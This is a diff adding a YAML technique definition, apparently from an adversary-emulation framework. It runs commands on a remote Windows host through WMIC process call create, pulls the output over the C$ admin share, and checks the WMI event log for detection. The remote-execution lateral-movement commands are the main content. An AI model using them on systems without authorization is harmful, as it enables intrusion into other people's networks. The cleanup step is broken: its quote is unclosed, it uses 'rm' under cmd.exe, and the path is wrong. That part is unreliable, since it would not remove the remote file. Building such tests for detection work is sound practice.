@@ -1,0 +1,62 @@
+---
+api_version: 2.0
+uuid: ccfd0b12-559c-403d-a589-984338db8347
+name: wmic-process-call-create
+authors:
+  - jaysong
+description: Use WMIC to create a process on a remote system and execute a command.
+args:
+  - name: command_or_path
+    default: hostname
+  - name: detect
+    default: true
+  - name: target_system
+  - name: remote_cmd_output_file
+    default: cmd_output.txt
+mitre:
+  tactics:
+    - TA0008 Lateral Movement
+  techniques:
+    - T1021 Remote Services
+requirements:
+  platforms:
+    - os: windows
+
+steps:
+  - name: create-remote-process
+    executor: cmd.exe
+    inline: |
+      wmic /node:"{{ .Args.target_system }}" process call create "cmd.exe /c {{ .Args.command_or_path }} > C:\{{ .Args.remote_cmd_output_file }}"
+
+  - name: retrieve-output
+    executor: powershell
+    inline: |
+      Get-Content \\{{ .Args.target_system }}\C$\{{ .Args.remote_cmd_output_file }}
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        wmic /node:"{{ .Args.target_system }}" process call create "cmd.exe /c rm {{ .Args.remote_cmd_output_file }}
+
+  - name: check-detection
+    executor: cmd.exe
+    inline: |
+      @echo off
+      setlocal
+      set detect={{ .Args.detect }}
+
+      if "%detect%" == "true" (
+        wevtutil qe Microsoft-Windows-WMI-Activity/Operational /f:text > temp.txt
+        findstr /C:"5857" temp.txt > events.txt
+        set /p EVENTS=<events.txt
+        if defined EVENTS (
+          echo WMIC remote process creation event detected.
+        ) else (
+          echo No WMIC remote process creation events detected.
+        )
+      )
+    cleanup:
+      name: cleanup
+      executor: powershell
+      inline: |
+        Remove-Item temp.txt
+        Remove-Item events.txt
